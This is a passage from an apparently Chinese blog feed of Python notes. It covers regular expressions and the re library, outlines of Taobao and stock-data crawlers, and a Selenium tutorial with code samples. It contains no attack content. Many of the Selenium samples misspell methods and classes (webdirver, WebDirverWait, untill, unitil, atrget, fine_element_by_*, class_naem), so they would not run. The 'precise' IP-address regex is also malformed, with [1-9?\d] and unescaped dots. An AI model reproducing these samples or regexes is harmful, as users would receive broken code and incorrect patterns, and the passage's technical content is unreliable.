title="经典的正则表达式实例"></a>经典的正则表达式实例</h3><table><thead><tr><th><strong>正则表达式</strong></th><th>说明</th></tr></thead><tbody><tr><td>^[A-Za-z]+$</td><td>由26个字母组成的字符串</td></tr><tr><td>^[A-Za-z0-9]+$</td><td>由26个字母和数字组成的字符串</td></tr><tr><td>^-?\d+$</td><td>整数形式的字符串</td></tr><tr><td>^[0-9]*[1-9] [0-9] *$</td><td>正整数形式的字符串</td></tr><tr><td>[1-9]\d{5}</td><td>中国境内邮政编码，6位</td></tr><tr><td>[\u4e00-\u9fa5]</td><td>匹配中文字符</td></tr><tr><td>\d{3}-\d{8}|\d{4}-\d{7}</td><td>国内电话号码，010-68913536</td></tr></tbody></table><h4 id="匹配IP地址的正则表达式"><a href="#匹配IP地址的正则表达式" class="headerlink" title="匹配IP地址的正则表达式"></a>匹配IP地址的正则表达式</h4><p>ip地址字符串形式的正则表达式（ip地址分4段，每段0-255）</p><ul><li><p>\d+.\d+.\d+.\d+</p></li><li><p>\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}</p></li></ul><p>精确写法</p><p>0-99：[1-9?\d]    </p><p>100-199：1\d{2}</p><p>200-249：2[0-4]\d</p><p>250-255：25[0-5]</p><p><strong>(([1-9?\d]|1\d{2}|2[0-4]\d|25[0-5]).){3}([1-9?\d]|1\d{2}|2[0-4]\d|25[0-5])</strong></p><h1 id="Re库"><a href="#Re库" class="headerlink" title="Re库"></a>Re库</h1><p>Re库是Python的标准库，主要用于字符串匹配。</p><p><strong>调用方法：import re</strong></p><h2 id="正则表达式的表示类型"><a href="#正则表达式的表示类型" class="headerlink" title="正则表达式的表示类型"></a>正则表达式的表示类型</h2><h3 id="raw-string类型（原生字符串类型）"><a href="#raw-string类型（原生字符串类型）" class="headerlink" title="raw string类型（原生字符串类型）"></a>raw string类型（原生字符串类型）</h3><p><strong>re库采用raw string类型表示正则表达式，表示为：r’tetx’</strong></p><p>例如：r ‘[1-9]\d{5}’</p><p>​            ‘\d{3}-\d{8}|\d{4}-\d{7}’</p><p><strong>raw string类型不包含转义符</strong></p><h3 id="string类型，更繁琐"><a href="#string类型，更繁琐" class="headerlink" title="string类型，更繁琐"></a>string类型，更繁琐</h3><p>例如：r ‘[1-9] \\d{5}’</p><p>​            ‘\\d{3}-\\d{8}|\\d{4}-\\d{7}’</p><h2 id="Re库主要功能函数"><a href="#Re库主要功能函数" class="headerlink" title="Re库主要功能函数"></a>Re库主要功能函数</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>re.search()</td><td>在一个字符串中<strong>搜素匹配正则表达式的第一个位置</strong>，返回match对象</td></tr><tr><td>re.match()</td><td>从一个字符串的<strong>开始位置起匹配正则表达式</strong>，返回match对象</td></tr><tr><td>re.findall()</td><td>搜索字符串，<strong>从列表类型返回全部能匹配的子串</strong></td></tr><tr><td>re.split()</td><td>将一个字符串<strong>按照正则表达式匹配结果进行分割，返回列表类型</strong></td></tr><tr><td>re.finditer()</td><td>搜索字符串，返回一个匹配结果的<strong>迭代类型</strong>，每个迭代元素是match对象</td></tr><tr><td>re.sub()</td><td>在一个字符串中<strong>替代所有匹配正则表达式的子串，返回替换后的字符串</strong></td></tr></tbody></table><h3 id="re-search-pattern-string-flags-0"><a href="#re-search-pattern-string-flags-0" class="headerlink" title="re.search(pattern, string, flags=0)"></a>re.search(pattern, string, flags=0)</h3><h3 id="re-match-pattern-string-flags-0"><a href="#re-match-pattern-string-flags-0" class="headerlink" title="re.match(pattern, string, flags=0)"></a>re.match(pattern, string, flags=0)</h3><h3 id="re-findall-pattern-string-flags-0"><a href="#re-findall-pattern-string-flags-0" class="headerlink" title="re.findall(pattern, string, flags=0)"></a>re.findall(pattern, string, flags=0)</h3><h3 id="re-split-pattern-string-maxsplit-0-flags-0）"><a href="#re-split-pattern-string-maxsplit-0-flags-0）" class="headerlink" title="re.split(pattern, string, maxsplit=0, flags=0）"></a>re.split(pattern, string, maxsplit=0, flags=0）</h3><h3 id="re-finditer-pattern-string-flags-0"><a href="#re-finditer-pattern-string-flags-0" class="headerlink" title="re.finditer(pattern, string, flags=0)"></a>re.finditer(pattern, string, flags=0)</h3><h3 id="re-sub-pattern-repl-string-count-0-flags-0"><a href="#re-sub-pattern-repl-string-count-0-flags-0" class="headerlink" title="re.sub(pattern, repl, string, count=0, flags=0)"></a>re.sub(pattern, repl, string, count=0, flags=0)</h3><p>pattern：正则表达式的字符串或原生字符串表示 </p><p>repl：替换匹配字符串的字符串</p><p>string：待匹配字符串</p><p>count：匹配的最大替换次数</p><p>maxsplit：最大分割数，剩余部分作为最后一个元素输出</p><p>flags：正则表达式使用时的控制标记</p><table><thead><tr><th>常用标志</th><th>说明</th></tr></thead><tbody><tr><td>re.I  re.IGNORECASE</td><td>忽略正则表达式的大小写，[A-Z]能匹配到小写字符</td></tr><tr><td>re.M   re.MULTILINE</td><td>正则表达式中的^操作符能够将给定字符串的每行当做匹配开始</td></tr><tr><td>re.S   re.DOTALL</td><td>正则表达式中的 . 操作符能够匹配所有字符，默认匹配除换行外所有字符</td></tr></tbody></table><h3 id="regex-re-compile-pattern-flags-0"><a href="#regex-re-compile-pattern-flags-0" class="headerlink" title="regex = re.compile(pattern, flags=0)"></a>regex = re.compile(pattern, flags=0)</h3><p>将正则表达式的字符串形式编译成正则表达式对象</p><h2 id="Re库的match对象"><a href="#Re库的match对象" class="headerlink" title="Re库的match对象"></a>Re库的match对象</h2><p><strong>Match对象的属性</strong></p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.string</td><td>待匹配的文本</td></tr><tr><td>.re</td><td>匹配时使用的pattern对象（正则表达式）</td></tr><tr><td>.pos</td><td>正则表达式搜索文本的开始位置</td></tr><tr><td>.endpos</td><td>正则表达式搜索文本的结束位置</td></tr></tbody></table><p><strong>Match对象的方法</strong> </p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>.group(0)</td><td>获得匹配后的字符串</td></tr><tr><td>.start()</td><td>匹配字符串在原始字符串的开始位置</td></tr><tr><td>.end()</td><td>匹配字符串在原始字符串的结束位置</td></tr><tr><td>.span()</td><td>返回（.start(),.end()）</td></tr></tbody></table><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580978553749.png"  alt="1580978553749"></p><h2 id="Re库的贪婪匹配和最小匹配"><a href="#Re库的贪婪匹配和最小匹配" class="headerlink" title="Re库的贪婪匹配和最小匹配"></a>Re库的贪婪匹配和最小匹配</h2><h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><p>Re库默认采用贪婪匹配，即输出匹配最长的子串。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580979000373.png"  alt="1580979000373"></p><h3 id="最小匹配"><a href="#最小匹配" class="headerlink" title="最小匹配"></a>最小匹配</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580979138434.png"  alt="1580979138434"></p><p><strong>最小匹配操作符</strong></p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>*?</td><td>前一个字符0次或无限次扩展，最小匹配</td></tr><tr><td>+?</td><td>前一个字符1次或无限次扩展，最小匹配</td></tr><tr><td>??</td><td>前一个字符0次或1次扩展，最小匹配</td></tr><tr><td>{m,n}?</td><td>扩展前一个字符m至n次（含n），最小匹配</td></tr></tbody></table><h2 id="实例：淘宝商品信息定向爬虫"><a href="#实例：淘宝商品信息定向爬虫" class="headerlink" title="实例：淘宝商品信息定向爬虫"></a>实例：淘宝商品信息定向爬虫</h2><h3 id="程序的结构设计"><a href="#程序的结构设计" class="headerlink" title="程序的结构设计"></a>程序的结构设计</h3><p>步骤1：提交商品搜索请求，循环获取页面</p><p>步骤2：对于每个页面，提取商品名称和价格信息</p><p>步骤3：将信息输出到屏幕上</p><h2 id="实例：股票数据定向爬虫"><a href="#实例：股票数据定向爬虫" class="headerlink" title="实例：股票数据定向爬虫"></a>实例：股票数据定向爬虫</h2><p>目标：获取上交所和深交所所有股票的名称和交易信息</p><p>输出：保存到文件中</p><p>技术路线：requests—bs4—re</p><p><strong>候选数据网站</strong></p><p>新浪股票：<a href="http://finance.sina.com.cn/stock/" target="_blank" rel="noopener">http://finance.sina.com.cn/stock/</a></p><p>百度股票：<a href="http://gupiao.baidu.com/stock" target="_blank" rel="noopener">http://gupiao.baidu.com/stock</a></p><p><strong>候选数据网站的选取原则</strong></p><p>选取原则：股票信息静态存在于HTML页面中，非js代码生成，没有Robots协议限制</p><p>选取方法：游览器F12，源代码查看等</p><p><strong>程序设计结构</strong></p><p>步骤1：获取股票列表</p><p>步骤2：根据股票列表逐个到百度股票回去个股信息</p><p>步骤3：将结果存储到文件</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之Selenium库</title>
      <link href="/2020/04/27/Selenium%E5%BA%93/"/>
      <url>/2020/04/27/Selenium%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Selenium库"><a href="#Selenium库" class="headerlink" title="Selenium库"></a>Selenium库</h1><p>自动化测试工具，支持多种游览器</p><p>爬虫中主要用来解决JavaScript渲染的问题</p><h2 id="安装Selenium"><a href="#安装Selenium" class="headerlink" title="安装Selenium"></a>安装Selenium</h2><p>pip3 install selenium</p><p>安装游览器驱动</p><p>下载驱动地址：<a href="https://github.com/mozilla/geckodriver/releases/" target="_blank" rel="noopener">https://github.com/mozilla/geckodriver/releases/</a></p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDirverWait</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()<span class="comment">#申明游览器对象</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">    input = browser.find_element_by_id(<span class="string">'kw'</span>)<span class="comment">#查找id为kw的元素</span></span><br><span class="line">    input.send_keys(<span class="string">'Python'</span>)<span class="comment">#向元素发送键，敲入Python</span></span><br><span class="line">    input.send_keys(Keys.ENTER)<span class="comment">#敲入回车</span></span><br><span class="line">    wait = WebDriverWait(browser,<span class="number">10</span>)<span class="comment">#调用等待</span></span><br><span class="line">    wait.untill(EC.presence_of_element_located((By.ID,<span class="string">'content_left'</span>)))<span class="comment">#等待ID为content_left元素加载</span></span><br><span class="line">    print(browser.current_url)<span class="comment">#打印当前的url</span></span><br><span class="line">    print(browser.get_cookies())<span class="comment">#打印当前cookie</span></span><br><span class="line">    print(browser.page_source)<span class="comment">#page_source，打印网页源代码</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.close()<span class="comment">#关掉游览器</span></span><br></pre></td></tr></table></figure><h3 id="声明游览器对象"><a href="#声明游览器对象" class="headerlink" title="声明游览器对象"></a>声明游览器对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdirver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser = webdriver.Firefox()<span class="comment">#申明游览器对象</span></span><br><span class="line">browser = webdriver.Edge()</span><br><span class="line">browser = webdriver.PhantomJS()</span><br><span class="line">browser = webdriver.Safari()</span><br></pre></td></tr></table></figure><h3 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdirver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"></span><br><span class="line">browser = webdirver.Firefox()<span class="comment">#申明游览器对象</span></span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">print(browser.page_source)<span class="comment">##page_source，打印网页源代码</span></span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><h3 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h3><h4 id="单个元素"><a href="#单个元素" class="headerlink" title="单个元素"></a>单个元素</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdirver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"></span><br><span class="line">browser = webdirver.Firefox()<span class="comment">#申明游览器对象</span></span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#三种方法查找</span></span><br><span class="line">input_first = browser.find_element_by_id(<span class="string">'q'</span>)<span class="comment">#查找id为q的元素</span></span><br><span class="line">input_second = browser.find_element_by_css_selector(<span class="string">'#q'</span>)<span class="comment">#使用css选择器查找</span></span><br><span class="line">input_third = browser.find_element_by_xpath(<span class="string">'//*[@id="q"]'</span>)<span class="comment">#使用xpath选择器查找</span></span><br><span class="line"></span><br><span class="line">print(input_first,input_second,input_third)</span><br><span class="line">browser.close</span><br></pre></td></tr></table></figure><h5 id="其他查找方法"><a href="#其他查找方法" class="headerlink" title="其他查找方法"></a>其他查找方法</h5><ul><li>fine_element_by_name</li><li>fine_element_by_xpath</li><li>fine_element_by_link_text</li><li>fine_element_by_partial_link_text</li><li>fine_element_by_tag_name</li><li>fine_element_by_class_name</li><li>fine_element_by_css_selector</li></ul><h5 id="通用查找方法"><a href="#通用查找方法" class="headerlink" title="通用查找方法"></a>通用查找方法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">input_first = browser.find_element(By.ID,<span class="string">'q'</span>)</span><br><span class="line">print(input_first)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><h4 id="多个元素"><a href="#多个元素" class="headerlink" title="多个元素"></a>多个元素</h4><p>与单个元素的区别是<strong>单元数是element</strong>，<strong>多元素是elements</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">lis = browser.find_elements_by_css_selector(<span class="string">'.service-bd li'</span>)</span><br><span class="line">print(lis)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">lis = browser.find_elements(By.CSS_SELECTOR,<span class="string">'.service-bd li'</span>)</span><br><span class="line">print(lis)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><h5 id="其他查找方法-1"><a href="#其他查找方法-1" class="headerlink" title="其他查找方法"></a>其他查找方法</h5><ul><li>fine_elements_by_name</li><li>fine_elements_by_xpath</li><li>fine_elements_by_link_text</li><li>fine_elements_by_partial_link_text</li><li>fine_elements_by_tag_name</li><li>fine_elements_by_class_name</li><li>fine_elements_by_css_selector</li></ul><h3 id="元素交互操作"><a href="#元素交互操作" class="headerlink" title="元素交互操作"></a>元素交互操作</h3><p>对获取的元素调用交互方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">input = browser.find_element_by_id(<span class="string">'q'</span>)<span class="comment">#查找id为q的元素，实际是输入框</span></span><br><span class="line">input.send_keys(<span class="string">'iPhone'</span>)<span class="comment">#输入键为iPhone</span></span><br><span class="line">time.sleep(<span class="number">1</span>)<span class="comment">#等待一秒</span></span><br><span class="line">input.clear()<span class="comment">#清空文本框</span></span><br><span class="line">input.send_keys(<span class="string">'iPad'</span>)<span class="comment">#输入键为iPad</span></span><br><span class="line">button = browser.find_element_by_classs_name(<span class="string">'btn-search'</span>)<span class="comment">#查找name为btn-search的元素</span></span><br><span class="line">button.click()<span class="comment">#跳转请求为搜索结果</span></span><br></pre></td></tr></table></figure><h3 id="交互动作"><a href="#交互动作" class="headerlink" title="交互动作"></a>交互动作</h3><p>将动作附加到动作链中串行执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'http://www.runoob.com/try/try.php?filename=jqueryui-apl-droppable'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)<span class="comment">#切换到iframeResult元素里面</span></span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">'#draggable'</span>)<span class="comment">#查找draggable拖拽元素</span></span><br><span class="line">target = browser.find_element_by_css_selector(<span class="string">'#droppable'</span>)<span class="comment">#查找droppable被拖拽元素</span></span><br><span class="line">actions = ActionChains(browser)<span class="comment">#申明动作对象</span></span><br><span class="line">actions.drag_and_drop(source,atrget)<span class="comment">#进行拖拽</span></span><br><span class="line">actions.perform()<span class="comment">#执行拖拽动作</span></span><br></pre></td></tr></table></figure><h3 id="执行JavaScript"><a href="#执行JavaScript" class="headerlink" title="执行JavaScript"></a>执行JavaScript</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'window.scrollTo(0,document.body.scrollHeight)'</span>)<span class="comment">#下拉到网页最下端</span></span><br><span class="line">browser.execute_script(<span class="string">'alert("To Bottom")'</span>)<span class="comment">#提示信息To Bottom</span></span><br></pre></td></tr></table></figure><h3 id="获取元素信息"><a href="#获取元素信息" class="headerlink" title="获取元素信息"></a>获取元素信息</h3><h4 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">logo = browser.find_element_by_id(<span class="string">'zh-top-link-logo'</span>)</span><br><span class="line">print(logo)</span><br><span class="line">print(logo.get_attribute(<span class="string">'class'</span>))</span><br></pre></td></tr></table></figure><h4 id="获取文本值"><a href="#获取文本值" class="headerlink" title="获取文本值"></a>获取文本值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">input = browser.find_element_by_class_name(<span class="string">'zh-top-link-logo'</span>)</span><br><span class="line">print(input.text)</span><br></pre></td></tr></table></figure><h4 id="获取ID、位置、标签名、大小"><a href="#获取ID、位置、标签名、大小" class="headerlink" title="获取ID、位置、标签名、大小"></a>获取ID、位置、标签名、大小</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">input = browser.find_element_by_class_name(<span class="string">'zh-top-add-question'</span>)</span><br><span class="line">print(input.id)</span><br><span class="line">print(input.location)</span><br><span class="line">print(input.tag_name)</span><br><span class="line">print(input.size)</span><br></pre></td></tr></table></figure><h4 id="Frame"><a href="#Frame" class="headerlink" title="Frame"></a>Frame</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> NoSuchElementException</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'http://www.runoob.com/try/try.php?filename=jqueryui-apl-droppable'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)<span class="comment">#切换到iframeResult元素里面</span></span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">'#draggable'</span>)</span><br><span class="line">print(source)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    logo = browser.fine_element_by_class_name(<span class="string">'logo'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">'NO LOGO'</span>)</span><br><span class="line">browser.switch_to.parent_frame()<span class="comment">#切换到其他frame</span></span><br><span class="line">logo = browser.find_element_by_class_naem(<span class="string">'logo'</span>)</span><br><span class="line">print(logo)</span><br><span class="line">print(logo.text)</span><br></pre></td></tr></table></figure><h3 id="等待"><a href="#等待" class="headerlink" title="等待"></a>等待</h3><h4 id="隐式等待"><a href="#隐式等待" class="headerlink" title="隐式等待"></a>隐式等待</h4><p>当使用隐式等待执行测试的时候，如果webDriver没有在DOM中找到元素，将继续等待，超出设定时间后这抛出找不到元素异常。当查找元素或元素并没有立即出现的时候，隐式等待将等待一段时间再查早DOM，默认的时间是0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">url = <span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">input = browser.find_element_by_class_name(<span class="string">'zh-top-add-question'</span>)</span><br><span class="line">print(input)</span><br></pre></td></tr></table></figure><h4 id="显示等待"><a href="#显示等待" class="headerlink" title="显示等待"></a>显示等待</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'https://www.taobao.com/'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">wait = WebDriverWait(browser,<span class="number">10</span>)</span><br><span class="line">input = wait.unitil(EC.presence_of_element_located((By.ID,<span class="string">'q'</span>)))</span><br><span class="line">button = waitunitil(EC.presence_to_be_clickable((By.CSS_SELECTOR,<span class="string">'.btn-search'</span>)))</span><br><span class="line">print(input,button)</span><br></pre></td></tr></table></figure><ul><li>title_is    标题内容</li><li>title_contains    标题包含元素</li><li>presence_of_element_located    元素加载出，传入定位元组，如（By.ID，’p’）</li><li>visiblility_of_element_located    元素可见，传入定位元组</li><li>visiblility_of    可见，传入元素对象</li><li>presence_of_all_element_located    所有元素加载出</li><li>text_to_be_present_in_element    某个元素文本包含某文字</li><li>text_to_be_present_in_element_value    某个元素值包含某文字</li><li>frame_to_be_available_and_switch_to_it frame    加载并切换</li><li>invisibility_of_element_located    元素不可见</li><li>element_to_be_clickable    元素可点击</li><li>staleness_of    判断一个元素是否仍在DOM，可判断页面是否已经刷新</li><li>element_to_be_selected    元素可选择，传元素对象</li><li>element_location_to_be_selected    元素可选择，传入定位元组</li><li>element_selection_state_to_be    传入元素对象以及状态，相等返回True，否则False</li><li>element_location_selected_state_to_be    传入定位元组以及状态，相等返回True，否则False</li><li>alert_is_present    是否出现Alert</li></ul><h3 id="前进后退"><a href="#前进后退" class="headerlink" title="前进后退"></a>前进后退</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 